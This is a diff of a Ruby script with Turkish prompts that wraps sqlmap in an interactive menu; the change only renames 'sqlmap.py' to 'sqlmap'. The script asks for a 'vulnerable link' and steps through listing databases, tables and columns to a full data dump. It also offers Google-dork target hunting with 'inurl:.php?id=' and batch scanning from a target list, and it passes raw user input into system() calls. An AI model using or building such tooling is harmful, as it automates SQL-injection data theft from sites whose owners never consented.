@@ -216,16 +216,16 @@ Column(s) : #{column}
             system("clear")
             print "Link : ".yellow
             acikli_link = gets.chop
-            system("sqlmap.py -u #{acikli_link} --dbs --random-agent")
+            system("sqlmap -u #{acikli_link} --dbs --random-agent")
             print "Database : ".yellow
             database = gets.chop
-            system ("sqlmap.py -u #{acikli_link} -D #{database} --tables --random-agent")
+            system ("sqlmap -u #{acikli_link} -D #{database} --tables --random-agent")
             print "Table : ".yellow
             table = gets.chop
-            system("sqlmap.py -u #{acikli_link} -D #{database} -T #{table} --columns --random-agent")
+            system("sqlmap -u #{acikli_link} -D #{database} -T #{table} --columns --random-agent")
             print "Column(s) : ".yellow
             column = gets.chop
-            system("sqlmap.py -u #{acikli_link} -D #{database} -T #{table} -C #{column} --dump --random-agent")
+            system("sqlmap -u #{acikli_link} -D #{database} -T #{table} -C #{column} --dump --random-agent")
             print "Bilgiler kaydedilsin mi (e/h) : ".yellow
             kaydet = gets.chop
             if kaydet == "e"
@@ -248,17 +248,17 @@ Column(s) : #{column}
         elsif islemm == "2"
             print "Dork : ".yellow
             dork = gets.chop
-            system("sqlmap.py -g #{dork}")
+            system("sqlmap -g #{dork}")
         elsif islemm == "3"
             print "TXT (örnek D:\\Notlarım\\hedef.txt) : ".yellow
             hedef = gets.chop
-            system("sqlmap.py -m #{hedef}")
+            system("sqlmap -m #{hedef}")
         elsif islemm == "4"
             system("cls")
             print "Site (örnek : google.com) : ".yellow
             siteadres = gets.chop
             gercek = "inurl:#{siteadres} inurl:.php?id="
-            system("sqlmap.py -g #{gercek}")
+            system("sqlmap -g #{gercek}")
         end
     else
         system("cls")
